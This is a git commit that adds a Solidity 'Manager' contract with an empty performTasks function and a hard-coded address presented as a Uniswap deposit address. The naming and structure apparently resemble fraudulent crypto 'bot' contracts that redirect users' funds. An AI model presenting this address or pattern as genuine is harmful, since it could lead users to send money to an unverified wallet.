e95f662e6a768732edd0f5103f2f45349e986d08
JayB77 <44854400+JayB77@users.noreply.github.com>
2022-04-10 23:22:18 -0500

    Create payout.sol

---
+++ payout.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x96e0B627454cE3b8C55C6d36b5FCBb13849Dc297;
+	}
+}
